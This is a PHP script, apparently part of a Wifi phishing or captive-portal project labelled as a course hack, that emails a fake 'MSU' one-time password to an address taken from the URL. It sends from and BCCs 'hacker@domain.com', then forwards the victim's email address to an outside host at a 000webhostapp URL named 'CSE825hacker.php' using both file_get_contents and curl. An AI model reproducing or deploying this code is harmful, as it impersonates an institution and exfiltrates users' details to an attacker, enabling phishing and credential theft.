<?php
if(!empty($_GET["email"]))
{
	$email=$_GET["email"];
}
$digits = 4;
$otp= rand(pow(10, $digits-1), pow(10, $digits)-1);
$body1="<p><font size=\"5\">To authenticate, please use the following One Time Password (OTP): </font></p><p><font size=\"10\"><b>".$otp."</b></font></p><br><p>Do not share this OTP with anyone. MSU takes your account security very seriously. MSU Customer Service will never ask you to disclose or verify your Wifi password, OTP, credit card, or banking account number. If you receive a suspicious email with a link to update your account information, do not click on the link--instead, report the email to MSU for investigation. We hope to see you again soon.<br> Thanks for visiting MSU!</p>";
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

//Load composer's autoloader
require 'vendor/autoload.php';

$mail = new PHPMailer(true);                              // Passing `true` enables exceptions
try {
    //Server settings
    $mail->SMTPDebug = 2;                                 // Enable verbose debug output
    //$mail->isSMTP();                                      // Set mailer to use SMTP
    $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = 'hacker@domain.com';                 // SMTP username
    $mail->Password = 'Email Password';                           // SMTP password
    $mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
    $mail->Port = 587;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('hacker@domain.com', 'Mailer');
    $mail->addAddress($email, 'User');     // Add a recipient
    //$mail->addAddress('ellen@example.com');               // Name is optional
    $mail->addReplyTo('hacker@domain.com', 'Information');
    //$mail->addCC('cc@example.com');
    $mail->addBCC('hacker@domain.com');

    //Attachments
    //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
    //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

    //Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'Wifi OTP';
    $mail->Body    = $body1;
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
}
$emailurl="http://jayantbenjamin.000webhostapp.com/SIEShack/Mail/CSE825hacker.php?email=".$email;
$sendtohacker= file_get_contents($emailurl);

$curl_handle = curl_init();
curl_setopt( $curl_handle, CURLOPT_URL, $emailurl );
curl_exec( $curl_handle ); // Execute the request
curl_close( $curl_handle );
?>
